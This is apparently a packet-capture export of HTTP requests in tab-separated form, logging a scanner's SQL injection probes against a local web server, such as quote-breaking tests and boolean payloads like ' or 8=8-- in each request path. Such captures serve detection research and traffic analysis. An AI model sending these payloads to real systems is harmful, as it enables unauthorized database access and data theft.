http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.106									41						1	http://192.168.1.106/w'%2b'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%2b'eb
																											192.168.1.106									42						1	http://192.168.1.106/w'%20'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%20'eb
																											192.168.1.106									43						1	http://192.168.1.106/w%7c%7c'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%7c%7c'eb
																											192.168.1.106									44						1	http://192.168.1.106/w%2b'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%2b'eb
																											192.168.1.106									45						1	http://192.168.1.106/w%20'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%20'eb
																											192.168.1.106									46						1	http://192.168.1.106/webxxx'%20or%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%208%3d8--
																											192.168.1.106									47						1	http://192.168.1.106/webxxx'%20or%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%207%3d5--
																											192.168.1.106									48						1	http://192.168.1.106/webxxx'%20or%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%207%3d7--
																											192.168.1.106									49						1	http://192.168.1.106/webxxx'%20or%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%205%3d8--
																											192.168.1.106									50						1	http://192.168.1.106/webxxx'%20or%20's'%3d's		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20's'%3d's
																											192.168.1.106									51						1	http://192.168.1.106/webxxx'%20or%20's'%3d'r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20's'%3d'r
																											192.168.1.106									52						1	http://192.168.1.106/webxxx'%20or%20't'%3d't		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20't'%3d't
																											192.168.1.106									53						1	http://192.168.1.106/webxxx'%20or%20't'%3d'r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20't'%3d'r
																											192.168.1.106									54						1	http://192.168.1.106/webxxx%22%20or%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%208%3d8--
																											192.168.1.106									55						1	http://192.168.1.106/webxxx%22%20or%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d5--
																											192.168.1.106									56						1	http://192.168.1.106/webxxx%22%20or%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d7--
																											192.168.1.106									57						1	http://192.168.1.106/webxxx%22%20or%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%205%3d8--
																											192.168.1.106									58						1	http://192.168.1.106/webxxx%22%20or%20%22s%22%3d%22s		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22s
																											192.168.1.106									59						1	http://192.168.1.106/webxxx%22%20or%20%22s%22%3d%22r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22r
																											192.168.1.106									60						1	http://192.168.1.106/webxxx%22%20or%20%22t%22%3d%22t		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22t%22%3d%22t
																											192.168.1.106									61						1	http://192.168.1.106/webxxx%22%20or%20%22t%22%3d%22r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22t%22%3d%22r
																											192.168.1.106									63						1	http://192.168.1.106/21%20or%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%208%3d8--
																											192.168.1.106									64						1	http://192.168.1.106/21%20or%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%207%3d5--
																											192.168.1.106									66						1	http://192.168.1.106/21%20or%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%207%3d7--
																											192.168.1.106									67						1	http://192.168.1.106/21%20or%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%205%3d8--
																											192.168.1.106									68						1	http://192.168.1.106/web'%20and%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%208%3d8--
																											192.168.1.106									69						1	http://192.168.1.106/web'%20and%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%207%3d5--
																											192.168.1.106									70						1	http://192.168.1.106/web'%20and%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%207%3d7--
																											192.168.1.106									71						1	http://192.168.1.106/web'%20and%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%205%3d8--
																											192.168.1.106									72						1	http://192.168.1.106/web'%20and%20's'%3d's		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%20's'%3d's
																											192.168.1.106									73						1	http://192.168.1.106/web'%20and%20's'%3d'r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%20's'%3d'r
																											192.168.1.106									74						1	http://192.168.1.106/web'%20and%20't'%3d't		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%20't'%3d't
																											192.168.1.106									75						1	http://192.168.1.106/web'%20and%20't'%3d'r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%20't'%3d'r
																											192.168.1.106									76						1	http://192.168.1.106/web%22%20and%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%208%3d8--
																											192.168.1.106									77						1	http://192.168.1.106/web%22%20and%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%207%3d5--
																											192.168.1.106									78						1	http://192.168.1.106/web%22%20and%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%207%3d7--
																											192.168.1.106									79						1	http://192.168.1.106/web%22%20and%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%205%3d8--
